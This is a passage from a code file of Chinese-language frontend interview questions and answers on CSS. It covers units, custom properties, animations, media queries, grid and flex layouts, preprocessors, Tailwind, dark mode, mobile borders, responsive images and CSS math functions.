.hero { height: 100vh; }

/* 布局用 % */
.container { width: 80%; max-width: 1200px; }

/* 注意 % 的 padding 陷阱 */
.parent { width: 200px; }
.child { padding-top: 50%; } /* 100px（相对父 width，非 height）*/`,
                difficulty: 'medium',
                tags: ['单位', 'rem', 'vw', '响应式'],
                keyPoints: ['em 相对父字号嵌套累积', 'rem 相对根字号统一', 'vw/vh 相对视口', '% 相对父元素'],
              },
              {
                id: 'css-variables',
                domain: 'css',
                question: 'CSS 自定义属性（变量）如何使用？与 Sass/Less 变量有何区别？',
                shortAnswer: 'CSS 变量用 --name 声明、var(--name) 使用，运行时可改、可继承、支持 JS 操作。Sass/Less 变量编译时确定、不可运行时改。CSS 变量更适合主题切换和动态样式。',
                detailedAnswer: 'CSS 自定义属性（CSS Variables）：\n\n声明与使用：\n:root { --primary: #007bff; }\n.btn { color: var(--primary); }\n.btn { color: var(--primary, #333); } /* 默认值 */\n\n作用域：\n- 全局：声明在 :root（相当于 html）\n- 局部：声明在某元素内，仅该元素及子元素可用\n- 可继承：子元素继承父元素的变量\n\n运行时操作：\n- CSS：.dark { --primary: #fff; }（切换 class 即换主题）\n- JS：element.style.setProperty("--primary", "#fff")\n- JS 读取：getComputedStyle(el).getPropertyValue("--primary")\n\n与 Sass/Less 变量区别：\n1. 运行时 vs 编译时：\n   - CSS 变量运行时存在，可动态修改\n   - Sass/Less 变量编译时确定，编译后固定\n2. 浏览器支持：\n   - CSS 变量原生效，无需编译\n   - Sass/Less 需编译器\n3. 作用域：\n   - CSS 变量基于 DOM 层级，可继承\n   - Sass/Less 基于代码块作用域\n4. 类型：\n   - CSS 变量是字符串（但可用于任意属性）\n   - Sass/Less 有类型（数字、颜色、列表等）\n5. 计算：\n   - CSS：calc(var(--x) * 2)\n   - Sass：$x * 2（直接计算）\n\n应用场景：\n- 主题切换（暗黑模式）：切换 :root 变量\n- 组件定制：通过变量传参\n- 响应式：媒体查询内重定义变量\n- 与 JS 交互：动态样式\n\n注意：\n- IE 不支持（现代项目可忽略）\n- 变量名区分大小写\n- 不能用于属性名（只能用于值）',
                codeExample: `/* 主题切换 */
:root {
  --bg: #fff;
  --text: #333;
}
.dark {
  --bg: #333;
  --text: #fff;
}
body { background: var(--bg); color: var(--text); }

/* JS 操作 */
document.documentElement.style.setProperty("--primary", "#ff0000");
const color = getComputedStyle(document.documentElement)
  .getPropertyValue("--primary");

/* 响应式重定义 */
:root { --font-size: 16px; }
@media (max-width: 768px) {
  :root { --font-size: 14px; }
}`,
                difficulty: 'medium',
                tags: ['CSS变量', '自定义属性', '主题'],
                keyPoints: ['--name 声明 var() 使用', '运行时可改可继承', 'Sass 变量编译时固定', '适合主题切换'],
              },
              {
                id: 'css-transition-animation',
                domain: 'css',
                question: 'transition 和 animation 的区别？animation 的关键属性有哪些？',
                shortAnswer: 'transition 需要触发（hover/click），只能从 A 到 B 两个状态；animation 自动执行，可定义多个关键帧（@keyframes），支持循环/暂停/方向。animation 更强大但更复杂。',
                detailedAnswer: 'transition（过渡）vs animation（动画）：\n\ntransition：\n- 需要触发条件（:hover、class 切换、JS 改样式）\n- 只有两个状态：起始和结束\n- 触发后自动反向（鼠标移出回弹）\n- 属性：transition: property duration timing-function delay\n- 简单状态变化用 transition\n\nanimation：\n- 自动执行（可设延迟）\n- 通过 @keyframes 定义多个关键帧\n- 支持循环（iteration-count）、方向（direction）、暂停（play-state）\n- 属性：\n  - animation-name：@keyframes 名称\n  - animation-duration：时长\n  - animation-timing-function：缓动函数\n  - animation-delay：延迟\n  - animation-iteration-count：循环次数（infinite 无限）\n  - animation-direction：normal/reverse/alternate/alternate-reverse\n  - animation-fill-mode：none/forwards/backwards/both（结束/开始时保持状态）\n  - animation-play-state：running/paused\n\n选择：\n- 简单的 A→B 过渡用 transition（更简单）\n- 多步骤、循环、自动播放用 animation\n\n性能：\n- 都优先动画 transform/opacity（GPU 加速）\n- 避免动画 width/height/top/left（触发回流）\n\n@keyframes 语法：\n@keyframes name {\n  0% { transform: translateX(0); }\n  50% { transform: translateX(100px); }\n  100% { transform: translateX(0); }\n}\n\n简写：animation: name 2s ease-in-out infinite alternate;',
                codeExample: `/* transition：hover 放大 */
.btn { transition: transform 0.3s ease; }
.btn:hover { transform: scale(1.1); }

/* animation：自动循环 */
@keyframes pulse {
  0%, 100% { transform: scale(1); opacity: 1; }
  50% { transform: scale(1.1); opacity: 0.8; }
}
.loading {
  animation: pulse 1.5s ease-in-out infinite;
}

/* JS 控制暂停 */
const el = document.querySelector(".anim");
el.style.animationPlayState = "paused"; // 暂停
el.style.animationPlayState = "running"; // 继续`,
                difficulty: 'medium',
                tags: ['transition', 'animation', '动画'],
                keyPoints: ['transition 需触发两状态', 'animation 自动多关键帧', 'animation 支持循环/暂停', '优先动画 transform'],
              },
              {
                id: 'css-media-query',
                domain: 'css',
                question: '媒体查询的语法？移动优先和桌面优先如何写？prefers-color-scheme 怎么用？',
                shortAnswer: '@media (条件) { 样式 }。移动优先用 min-width（默认小屏渐进增强），桌面优先用 max-width（默认大屏降级）。prefers-color-scheme: dark 实现暗黑模式。',
                detailedAnswer: '媒体查询语法：\n@media [not|only] [媒体类型] and [条件] { 样式 }\n- 媒体类型：screen（屏幕）、print（打印）、all（默认）\n- 条件：宽度、高度、方向、分辨率、偏好等\n\n常见条件：\n- (max-width: 768px)：最大宽度 768px 时生效\n- (min-width: 769px)：最小宽度 769px 时生效\n- (orientation: portrait/landscape)：竖屏/横屏\n- (resolution: 2dppx)：高分辨率屏（Retina）\n- (prefers-color-scheme: dark/light)：系统暗/亮模式\n- (prefers-reduced-motion: reduce)：用户偏好减少动画\n- (hover: hover)：设备支持 hover\n\n移动优先（推荐）：默认写移动样式，min-width 逐步增强\n.btn { padding: 8px 16px; }           /* 默认移动 */\n@media (min-width: 768px) { ... }      /* 平板 */\n@media (min-width: 1024px) { ... }     /* 桌面 */\n\n桌面优先：默认写桌面，max-width 降级\n.btn { padding: 12px 24px; }           /* 默认桌面 */\n@media (max-width: 1023px) { ... }     /* 平板 */\n@media (max-width: 767px) { ... }      /* 移动 */\n\n断点推荐（Tailwind 默认）：\n- sm: 640px\n- md: 768px\n- lg: 1024px\n- xl: 1280px\n- 2xl: 1536px\n\nprefers-color-scheme 暗黑模式：\n:root { --bg: #fff; --text: #333; }\n@media (prefers-color-scheme: dark) {\n  :root { --bg: #1a1a1a; --text: #eee; }\n}\nbody { background: var(--bg); color: var(--text); }\n\n也可配合 JS 手动切换（加 .dark class）+ localStorage 记忆偏好。',
                codeExample: `/* 移动优先 */
.container { width: 100%; padding: 0 16px; }
@media (min-width: 768px) {
  .container { max-width: 720px; }
}
@media (min-width: 1024px) {
  .container { max-width: 960px; }
}

/* 暗黑模式 */
@media (prefers-color-scheme: dark) {
  body { background: #1a1a1a; color: #eee; }
  img { filter: brightness(0.8); }
}

/* 尊重用户减少动画偏好 */
@media (prefers-reduced-motion: reduce) {
  * { animation: none !important; transition: none !important; }
}`,
                difficulty: 'medium',
                tags: ['媒体查询', '响应式', '暗黑模式'],
                keyPoints: ['min-width 移动优先', 'max-width 桌面优先', 'prefers-color-scheme 暗黑', 'prefers-reduced-motion 无障碍'],
              },
              {
                id: 'css-flex-layout',
                domain: 'css',
                question: '用 Flex 实现三栏布局（左固定+中自适应+右固定）？圣杯和双飞翼布局的区别？',
                shortAnswer: 'Flex 三栏：左右 flex: 0 0 200px，中间 flex: 1。圣杯和双飞翼都是经典三栏布局，区别在于中间栏内容不被遮挡的处理方式：圣杯用 padding+relative，双飞翼用 margin+额外内层 div。',
                detailedAnswer: '三栏布局方案：\n\n1. Flex（推荐）：\n.layout { display: flex; }\n.left, .right { flex: 0 0 200px; } /* 不伸缩固定宽 */\n.center { flex: 1; }                /* 占剩余空间 */\n- 中间内容默认先渲染，DOM 顺序：left center right\n- 如想中间先渲染，DOM 顺序 center left right，用 order 调整\n\n2. Grid（更简洁）：\n.layout { display: grid; grid-template-columns: 200px 1fr 200px; }\n\n3. absolute + margin：左中右都 absolute，中间用 margin 留出空间\n\n4. float + margin：左 float:left，右 float:right，中间 margin 左右留空间\n\n圣杯布局（Holy Grail）：\n- 结构：center、left、right（center 在前，DOM 优先渲染）\n- 三者都 float:left + position:relative\n- 父 padding-left/right 留出左右栏空间\n- left 用 margin-left: -100% 拉到最左，right 用 margin-left: -200px 拉到最右\n- 缺点：center 宽度小于 left 时布局会错乱\n\n双飞翼布局：\n- 结构：center（外层 .main + 内层 .main-content）、left、right\n- 三者 float:left\n- left 用 margin-left: -100%，right 用 margin-left: -200px\n- center 内层 .main-content 用 margin-left/right 留出左右空间\n- 优点：不依赖 position:relative，更稳定\n\n圣杯 vs 双飞翼 区别：\n- 圣杯：父容器 padding 留空间 + 子 relative 偏移\n- 双飞翼：中间栏多套一层 div，内层 margin 留空间\n- 双飞翼更稳健（不依赖 relative），但 DOM 多一层\n\n现代实践：优先 Flex/Grid，圣杯/双飞翼是面试八股，了解原理即可。',
                codeExample: `/* Flex 三栏（推荐） */
.layout { display: flex; min-height: 100vh; }
.left { flex: 0 0 200px; background: #eee; }
.center { flex: 1; background: #fff; }
.right { flex: 0 0 200px; background: #eee; }

/* Grid 三栏（最简） */
.layout { display: grid; grid-template-columns: 200px 1fr 200px; min-height: 100vh; }

/* 圣杯布局 */
.holy-grail { padding-left: 200px; padding-right: 200px; }
.holy-grail > .center, .holy-grail > .left, .holy-grail > .right { float: left; position: relative; }
.holy-grail > .center { width: 100%; }
.holy-grail > .left { width: 200px; margin-left: -100%; left: -200px; }
.holy-grail > .right { width: 200px; margin-left: -200px; right: -200px; }`,
                difficulty: 'hard',
                tags: ['三栏布局', 'Flex', '圣杯', '双飞翼'],
                keyPoints: ['Flex 左右 flex:0 0 宽 中 flex:1', 'Grid grid-template-columns', '圣杯 padding+relative', '双飞翼 内层 margin'],
              },
              {
                id: 'css-grid-template',
                domain: 'css',
                question: 'Grid 的 grid-template-areas 如何使用？fr 单位和 minmax 的作用？',
                shortAnswer: 'grid-template-areas 用字符串命名网格区域直观布局；fr 是剩余空间比例单位；minmax(min, max) 限制轨道尺寸范围。三者配合可实现响应式自适应网格。',
                detailedAnswer: 'Grid grid-template-areas：\n用字符串命名网格区域，直观描述布局结构。\n\n基本用法：\n.layout {\n  display: grid;\n  grid-template-areas:\n    "header header header"\n    "sidebar main aside"\n    "footer footer footer";\n  grid-template-columns: 200px 1fr 200px;\n  grid-template-rows: auto 1fr auto;\n}\n.header { grid-area: header; }\n.main { grid-area: main; }\n\n规则：\n- 同名 area 占多个网格表示合并\n- . 表示空网格\n- 区域必须是矩形（不能 L 形）\n- 子元素用 grid-area: 名称 放置\n\n优势：\n- 语义化，布局一目了然\n- 响应式时只需改 areas 定义\n\nfr 单位（Fraction）：\n- 分配剩余空间的比例\n- grid-template-columns: 1fr 2fr 1fr → 比例 1:2:1\n- 与固定值混合：200px 1fr 200px（固定+剩余）\n- 与 minmax 配合更强大\n\nminmax(min, max)：\n- 限制轨道尺寸范围\n- minmax(200px, 1fr)：最小 200px，最大占 1fr\n- minmax(0, 1fr)：允许收缩到 0（防内容撑爆）\n- minmax(auto, max-content)：根据内容自适应\n\n响应式自适应网格（repeat + auto-fit + minmax）：\n.grid {\n  display: grid;\n  grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));\n  gap: 16px;\n}\n- auto-fit：自动填充列数\n- minmax(250px, 1fr)：每列最小 250px，剩余空间均分\n- 屏宽够放 3 列就 3 列，不够自动降为 2 列、1 列\n- 无需媒体查询实现响应式卡片网格\n\nrepeat()：\n- repeat(3, 1fr) = 1fr 1fr 1fr\n- repeat(auto-fill, 200px)：尽量多放固定宽列\n- repeat(auto-fit, minmax(...))：自适应',
                codeExample: `/* 经典页面布局 */
.layout {\n  display: grid;\n  min-height: 100vh;\n  grid-template-areas:\n    "header header"\n    "sidebar main"\n    "footer footer";\n  grid-template-columns: 200px 1fr;\n  grid-template-rows: auto 1fr auto;\n}\n.header { grid-area: header; }\n.sidebar { grid-area: sidebar; }\n.main { grid-area: main; }\n.footer { grid-area: footer; }\n\n/* 响应式：移动端单列 */\n@media (max-width: 768px) {\n  .layout {\n    grid-template-areas:\n      "header"\n      "main"\n      "sidebar"\n      "footer";\n    grid-template-columns: 1fr;\n  }\n}\n\n/* 自适应卡片网格 */\n.cards {\n  display: grid;\n  grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));\n  gap: 16px;\n}`,
                difficulty: 'medium',
                tags: ['Grid', 'grid-template-areas', 'fr', 'minmax'],
                keyPoints: ['areas 字符串命名布局', 'fr 剩余空间比例', 'minmax 限制范围', 'auto-fit 自适应列数'],
              },
              {
                id: 'css-sass-less',
                domain: 'css',
                question: 'Sass 和 Less 的区别？@mixin 和 @extend 各自适用场景？',
                shortAnswer: 'Sass（Ruby/Node 编译，缩进+SCSS 语法）功能强（控制指令、函数）；Less（JS 编译，类 CSS 语法）较简单。@mixin 复用代码块（带参数），@extend 继承选择器（生成分组选择器）。需参数用 mixin，纯样式合并用 extend。',
                detailedAnswer: 'Sass vs Less：\n\n1. 编译语言：\n   - Sass：原 Ruby，现 Dart-Sass（推荐）/Node-Sass（已废弃）\n   - Less：基于 JavaScript（less.js）\n\n2. 语法：\n   - Sass：缩进式（.sass，无分号大括号）+ SCSS（.scss，类 CSS）\n   - Less：完全类 CSS 语法\n\n3. 功能：\n   - Sass 功能更强：控制指令（@if/@for/@each）、自定义函数、map/list 类型\n   - Less 功能较简单，但满足日常需求\n\n4. 变量：\n   - Sass：$var（新版本也支持 --var）\n   - Less：@var\n\n5. 生态：\n   - Sass：Bootstrap 5、Foundation、Bourbon\n   - Less：Bootstrap 3 及之前\n\n现代趋势：原生 CSS 变量 + PostCSS 逐渐取代预处理器，但 Sass 在大型项目仍主流。\n\n@mixin vs @extend：\n\n@mixin（混入）：\n- 定义可复用代码块，可带参数\n- @include 调用，会复制代码到调用处\n- 适合：带参数的样式、浏览器前缀、媒体查询\n@mixin button($bg: blue) {\n  background: $bg;\n  border: none;\n  padding: 8px 16px;\n  &:hover { opacity: 0.8; }\n}\n.btn-primary { @include button(#007bff); }\n.btn-danger { @include button(#dc3545); }\n\n@extend（继承）：\n- 继承已有选择器的样式，生成分组选择器\n- 不带参数，纯样式合并\n- 适合：共享基础样式、修饰符类\n.message { padding: 10px; border: 1px solid; }\n.success { @extend .message; color: green; }\n.error { @extend .message; color: red; }\n// 编译为：.message, .success, .error { padding: 10px; ... }\n\n选择：\n- 需要参数或复杂逻辑 → @mixin\n- 纯样式合并、减少重复 → @extend\n- @extend 注意：会生成大量分组选择器，过度使用导致 CSS 膨胀\n- 现代实践：用占位符选择器 %base 配合 @extend（不输出 %base 本身）',
                codeExample: `/* SCSS mixin */\n@mixin prefix($prop, $val) {\n  -webkit-#{$prop}: $val;\n  -moz-#{$prop}: $val;\n  #{$prop}: $val;\n}\n.box { @include prefix(transform, rotate(10deg)); }\n\n/* SCSS extend + 占位符 */\n%card-base {\n  border-radius: 8px;\n  padding: 16px;\n  box-shadow: 0 2px 4px rgba(0,0,0,0.1);\n}\n.card-info { @extend %card-base; background: #e3f2fd; }\n.card-warn { @extend %card-base; background: #fff3e0; }\n\n/* Less */\n.rounded(@r: 4px) { border-radius: @r; }\n.btn { .rounded(8px); }`,
                difficulty: 'medium',
                tags: ['Sass', 'Less', 'mixin', 'extend'],
                keyPoints: ['Sass 功能强有控制指令', 'Less 简单 JS 编译', 'mixin 带参数复用代码', 'extend 继承生成分组选择器'],
              },
              {
                id: 'css-postcss-tailwind',
                domain: 'css',
                question: 'PostCSS 和 Tailwind 的关系？Tailwind 的优缺点？',
                shortAnswer: 'PostCSS 是 CSS 后处理器（用 JS 插件转换 CSS），Tailwind 是基于 PostCSS 的原子化 CSS 框架。Tailwind 优点：开发快、体积小（Purge）、样式一致；缺点：学习曲线、HTML 臃肿、调试难。',
                detailedAnswer: 'PostCSS：\n- 用 JavaScript 插件转换 CSS 的工具\n- 不是预处理器，是"后处理器"（也可前置）\n- 常用插件：autoprefixer（加浏览器前缀）、postcss-preset-env（用未来 CSS）、cssnano（压缩）、tailwindcss\n- 可与 Sass/Less 共存\n\nTailwind CSS：\n- 原子化（Utility-First）CSS 框架\n- 基于 PostCSS 构建（tailwindcss 是 PostCSS 插件）\n- 提供大量小工具类：flex、p-4、text-lg、bg-blue-500\n- 通过配置文件 theme 定制\n\nTailwind 优点：\n1. 开发快：不用起类名，直接组合工具类\n2. 体积小：PurgeCSS/JIT 只打包用到的类\n3. 样式一致：基于设计系统（spacing/color/font 预设）\n4. 响应式内置：md:p-4、lg:text-xl\n5. 暗黑模式：dark:bg-gray-900\n6. 不用切文件：HTML 内直接写样式\n\nTailwind 缺点：\n1. 学习曲线：需记工具类名（但有 IDE 提示）\n2. HTML 臃肿：class 字符串很长\n3. 调试难：DevTools 看到一堆工具类，难定位\n4. 复杂样式仍需 @apply 或自定义\n5. 团队需统一规范，否则混乱\n\n@apply 指令：在 CSS 中复用工具类\n.btn { @apply bg-blue-500 text-white px-4 py-2 rounded; }\n\nJIT 模式（v3+ 默认）：\n- Just-In-Time 编译，按需生成\n- 支持任意值：top-[117px]、bg-[#1da1f2]\n- 开发速度更快，产物更小\n\n何时用 Tailwind：\n- 新项目、原型开发、设计系统明确\n- 团队接受原子化理念\n\n何时不适合：\n- 已有大型传统 CSS 项目\n- 团队不熟悉、需快速接手',
                codeExample: `/* tailwind.config.js */
module.exports = {
  content: ["./src/**/*.{html,js,ts,jsx,tsx}"],
  darkMode: "class",
  theme: {
    extend: {\n      colors: { brand: "#007bff" },\n      spacing: { 18: "4.5rem" }\n    }\n  },\n  plugins: []\n}

/* HTML 使用 */
<button class="bg-blue-500 hover:bg-blue-600 text-white px-4 py-2 rounded transition">
  按钮
</button>

/* @apply 复用 */
.btn-primary {\n  @apply bg-blue-500 text-white px-4 py-2 rounded hover:bg-blue-600;\n}`,
                difficulty: 'medium',
                tags: ['PostCSS', 'Tailwind', '原子化CSS'],
                keyPoints: ['PostCSS 是 CSS 转换工具', 'Tailwind 基于 PostCSS', 'Tailwind 原子化体积小', 'JIT 按需生成'],
              },
              {
                id: 'css-dark-mode',
                domain: 'css',
                question: '实现暗黑模式有哪几种方案？如何避免闪烁？',
                shortAnswer: '方案：1) prefers-color-scheme 跟随系统 2) .dark class 手动切换 3) CSS 变量切换。避免闪烁：在 head 内联脚本读取 localStorage 并提前加 class（FOUC 防护）。',
                detailedAnswer: '暗黑模式实现方案：\n\n1. CSS 变量 + class 切换（推荐）：\n:root {\n  --bg: #fff; --text: #333; --border: #ddd;\n}\n.dark {\n  --bg: #1a1a1a; --text: #eee; --border: #333;\n}\nbody { background: var(--bg); color: var(--text); }\n- JS 切换：document.documentElement.classList.toggle("dark")\n- 配合 localStorage 记忆用户选择\n\n2. 跟随系统（prefers-color-scheme）：\n@media (prefers-color-scheme: dark) {\n  :root { --bg: #1a1a1a; --text: #eee; }\n}\n- 自动跟随系统设置，无需 JS\n- 缺点：用户无法手动覆盖\n\n3. 混合方案（推荐）：\n- 默认跟随系统\n- 用户手动切换后记忆，覆盖系统\n- 用 JS 同步 class 和 data 属性\n\n4. CSS 媒体查询直接写两套样式（不推荐，维护难）：\nbody { background: #fff; }\n@media (prefers-color-scheme: dark) {\n  body { background: #1a1a1a; }\n}\n\n避免闪烁（FOUC，Flash of Unstyled Content）：\n问题：页面加载时默认亮色，JS 读取偏好后切换为暗色，产生闪烁。\n\n解决：在 <head> 内联同步脚本，在 CSS 渲染前设置好 class。\n<script>\n  (function() {\n    const saved = localStorage.getItem("theme");\n    const prefersDark = window.matchMedia("(prefers-color-scheme: dark)").matches;\n    if (saved === "dark" || (!saved && prefersDark)) {\n      document.documentElement.classList.add("dark");\n    }\n  })();\n</script>\n- 必须内联在 head，不能外链（外链会延迟）\n- 必须同步执行，不能等 DOMContentLoaded\n\n图片适配：\n- 暗黑下降低亮度：.dark img { filter: brightness(0.8); }\n- 提供 dark 版图片：<picture><source srcset="dark.png" media="(prefers-color-scheme: dark)"><img src="light.png"></picture>\n\n过渡动画：\n* { transition: background-color 0.3s, color 0.3s; }\n- 切换更平滑（但注意性能，不要影响所有属性）',
                codeExample: `/* CSS 变量方案 */
:root {\n  --bg: #fff; --text: #333;\n}\n.dark {\n  --bg: #1a1a1a; --text: #eee;\n}\nbody { background: var(--bg); color: var(--text); transition: background 0.3s; }

/* head 内联防闪烁 */
<head>\n<script>\n  (function() {\n    const saved = localStorage.getItem("theme");\n    const prefersDark = matchMedia("(prefers-color-scheme: dark)").matches;\n    if (saved === "dark" || (!saved && prefersDark)) {\n      document.documentElement.classList.add("dark");\n    }\n  })();\n</script>\n</head>

/* 切换按钮 */
<button onclick="toggleTheme()">切换</button>\n<script>\nfunction toggleTheme() {\n  const isDark = document.documentElement.classList.toggle("dark");\n  localStorage.setItem("theme", isDark ? "dark" : "light");\n}\n</script>`,
                difficulty: 'medium',
                tags: ['暗黑模式', 'CSS变量', 'FOUC'],
                keyPoints: ['CSS 变量切换', 'prefers-color-scheme 跟随系统', 'head 内联防闪烁', 'localStorage 记忆偏好'],
              },
              {
                id: 'css-scrollbar-mobile',
                domain: 'css',
                question: '移动端 1px 边框问题如何解决？iOS 滚动卡顿如何优化？',
                shortAnswer: '1px 问题：CSS 1px 在 Retina 屏显示更粗，用 transform: scale(0.5) + 伪元素或 viewport 缩放解决。iOS 滚动卡顿用 -webkit-overflow-scrolling: touch（旧版）或 overscroll-behavior 优化。',
                detailedAnswer: '移动端 1px 边框问题：\n\n原因：CSS 1px 是逻辑像素，Retina 屏设备像素比（DPR）为 2 或 3，1 逻辑像素对应 2~3 物理像素，显示更粗。\n\n解决方案：\n\n1. transform: scale(0.5) + 伪元素（推荐）：\n.border-1px::after {\n  content: "";\n  position: absolute;\n  left: 0; top: 0;\n  width: 200%; height: 200%;\n  border: 1px solid #ccc;\n  transform: scale(0.5);\n  transform-origin: 0 0;\n  box-sizing: border-box;\n}\n- DPR 3 用 scale(0.333)\n- 优点：兼容性好，清晰\n- 缺点：占伪元素\n\n2. viewport 缩放（rem 方案配合）：\n根据 DPR 设置 meta viewport 缩放\nconst dpr = window.devicePixelRatio || 1;\nconst scale = 1 / dpr;\ndocument.querySelector("meta[name=viewport]").setAttribute(\n  "content", `width=device-width, initial-scale=${scale}, maximum-scale=${scale}`\n);\n- 整页缩放，CSS 1px 即物理 1px\n- 缺点：影响整体布局\n\n3. box-shadow 模拟：\n.border-1px { box-shadow: 0 0 0 0.5px #ccc; }\n- 简单但兼容性一般\n\n4. 渐变背景：\n.border-1px { background: linear-gradient(#ccc, #ccc) no-repeat 100% 100% / 100% 1px; }\n\n5. flexible.js / postcss-write-svg 插件\n\niOS 滚动卡顿优化：\n\n1. -webkit-overflow-scrolling: touch（iOS 13 前需加）：\n.scroll { overflow: auto; -webkit-overflow-scrolling: touch; }\n- 启用惯性滚动\n- iOS 13+ 默认支持，可省略\n\n2. overscroll-behavior（现代）：\n.scroll { overscroll-behavior: contain; }\n- 防止滚动穿透（弹窗内滚动不带动背景）\n- 防止下拉刷新冲突\n\n3. position: fixed 锁定背景（弹窗场景）：\n弹窗打开时 body { position: fixed; width: 100%; }\n\n4. transform: translateZ(0) 触发硬件加速：\n.scroll-content { transform: translateZ(0); }\n- 提升滚动性能\n\n5. 避免大量 DOM、虚拟列表\n\n6. will-change: scroll-position 提示浏览器',
                codeExample: `/* 1px 边框方案（transform scale） */\n.border-1px {\n  position: relative;\n}\n.border-1px::after {\n  content: "";\n  position: absolute;\n  left: 0; top: 0;\n  width: 200%; height: 200%;\n  border: 1px solid #ccc;\n  transform: scale(0.5);\n  transform-origin: 0 0;\n  box-sizing: border-box;\n  pointer-events: none;\n}\n\n/* iOS 滚动优化 */\n.scroll {\n  overflow: auto;\n  -webkit-overflow-scrolling: touch; /* iOS 13- */\n  overscroll-behavior: contain;     /* 防滚动穿透 */\n}\n.scroll-content {\n  transform: translateZ(0); /* 硬件加速 */\n}`,
                difficulty: 'hard',
                tags: ['移动端', '1px', 'iOS滚动', 'DPR'],
                keyPoints: ['1px 因 DPR 显示粗', 'transform scale 0.5 解决', 'overflow-scrolling touch', 'overscroll-behavior 防穿透'],
              },
              {
                id: 'css-responsive-images',
                domain: 'css',
                question: '响应式图片如何实现？srcset/sizes/picture 的区别？',
                shortAnswer: 'srcset 提供多分辨率源让浏览器选（适配 DPR）；sizes 配合 srcset 指定不同视口宽度下的图片尺寸；picture 通过 source 的 media 条件切换不同图片（艺术指导，Art Direction）。',
                detailedAnswer: '响应式图片方案：\n\n1. srcset（分辨率切换）：\n<img \n  src="small.jpg" \n  srcset="small.jpg 1x, medium.jpg 2x, large.jpg 3x" \n  alt="...">\n- 浏览器根据设备 DPR（devicePixelRatio）自动选\n- 1x 屏选 small，2x 屏选 medium\n- 适合同一图片不同分辨率\n\n2. srcset + sizes（宽度切换）：\n<img\n  src="small.jpg"\n  srcset="small.jpg 400w, medium.jpg 800w, large.jpg 1200w"\n  sizes="(max-width: 600px) 100vw, 50vw"\n  alt="...">\n- w 描述符：图片实际宽度（400w = 400px 宽）\n- sizes：不同视口下图片显示宽度\n  - 视口 ≤600px 时图片占 100vw\n  - 其他占 50vw\n- 浏览器根据视口宽 + sizes 计算，选最合适的图\n- 适合不同尺寸显示同一图片\n\n3. picture + source（艺术指导）：\n<picture>\n  <source media="(max-width: 600px)" srcset="mobile.jpg">\n  <source media="(min-width: 1200px)" srcset="desktop.jpg">\n  <img src="default.jpg" alt="...">\n</picture>\n- 不同视口用不同裁剪/构图的图片\n- mobile 版可能是裁剪过的竖图，desktop 版是横图\n- 适合移动端和桌面端展示不同内容\n\n4. picture + type（格式切换）：\n<picture>\n  <source type="image/webp" srcset="photo.webp">\n  <source type="image/avif" srcset="photo.avif">\n  <img src="photo.jpg" alt="...">\n</picture>\n- 浏览器选支持的现代格式（webp/avif 更小）\n- 不支持时回退 jpg\n\n5. CSS 背景图响应式：\n.hero {\n  background-image: image-set(\n    url("small.jpg") 1x,\n    url("large.jpg") 2x\n  );\n}\n- 或用媒体查询切换\n\n选择：\n- 同图不同分辨率 → srcset + 1x/2x/w\n- 同图不同显示尺寸 → srcset + w + sizes\n- 不同图（裁剪/构图）→ picture + media\n- 现代格式 → picture + type\n\n其他：\n- loading="lazy" 懒加载\n- decoding="async" 异步解码\n- width/height 属性防布局抖动（CLS）',
                codeExample: `<!-- 1. 分辨率切换 -->\n<img src="small.jpg"\n  srcset="small.jpg 1x, medium.jpg 2x, large.jpg 3x"\n  alt="照片">\n\n<!-- 2. 宽度切换 -->\n<img src="small.jpg"\n  srcset="small.jpg 400w, medium.jpg 800w, large.jpg 1200w"\n  sizes="(max-width: 600px) 100vw, 50vw"\n  alt="照片" loading="lazy">\n\n<!-- 3. 艺术指导 -->\n<picture>\n  <source media="(max-width: 600px)" srcset="mobile-cropped.jpg">\n  <source media="(min-width: 1200px)" srcset="desktop-wide.jpg">\n  <img src="default.jpg" alt="照片">\n</picture>\n\n<!-- 4. 现代格式 -->\n<picture>\n  <source type="image/avif" srcset="photo.avif">\n  <source type="image/webp" srcset="photo.webp">\n  <img src="photo.jpg" alt="照片" width="800" height="600">\n</picture>`,
                difficulty: 'medium',
                tags: ['响应式图片', 'srcset', 'picture', 'webp'],
                keyPoints: ['srcset 按分辨率选', 'w + sizes 按宽度选', 'picture media 艺术指导', 'picture type 格式切换'],
              },
              {
                id: 'css-calc-clamp',
                domain: 'css',
                question: 'calc()、clamp()、min()/max() 函数如何使用？应用场景？',
                shortAnswer: 'calc() 四则运算（单位可混合）；clamp(min, preferred, max) 限制值范围；min()/max() 取多值中最小/最大。常用于响应式字号、动态尺寸，避免媒体查询。',
                detailedAnswer: 'CSS 数学函数：\n\n1. calc()：四则运算\n- 支持 + - * /\n- 单位可混合：calc(100% - 200px)、calc(2rem + 10px)\n- 嵌套：calc(calc(100% - 20px) / 2)\n- 注意：+ 和 - 两侧必须有空格，* 和 / 不要求\n- 应用：\n  - 全宽减边栏：width: calc(100% - 200px)\n  - 字号运算：font-size: calc(1rem + 2px)\n  - 与变量配合：calc(var(--gap) * 2)\n\n2. clamp(min, preferred, max)：限制值范围\n- 值 = max(min, min(preferred, max))\n- preferred 通常是响应式表达式\n- 应用：\n  - 响应式字号：font-size: clamp(1rem, 2.5vw, 2rem)\n    - 最小 1rem，最大 2rem，中间随视口\n  - 容器宽度：width: clamp(320px, 80vw, 1200px)\n  - 间距：padding: clamp(1rem, 3vw, 2rem)\n- 优点：无需媒体查询即可响应式\n\n3. min()：取最小值\n- min(50vw, 300px)：取两者中较小的\n- 应用：\n  - 容器不超宽：width: min(90vw, 1200px)\n  - 字号上限：font-size: min(5vw, 1.5rem)\n\n4. max()：取最大值\n- max(50vw, 300px)：取两者中较大的\n- 应用：\n  - 最小宽度：width: max(50vw, 300px)\n\nclamp vs min/max + 媒体查询：\n- clamp 一行解决范围限制，更简洁\n- 但复杂断点仍需媒体查询\n\n典型场景：\n- 流式字号：clamp(1rem, 0.5rem + 2vw, 2rem)（更线性）\n- 容器宽度：min(100% - 2rem, 1200px)\n- 间距自适应：clamp(1rem, 2vw, 2rem)\n- 防溢出：width: min(100%, 500px)\n\n浏览器支持：现代浏览器全部支持，IE 不支持。',
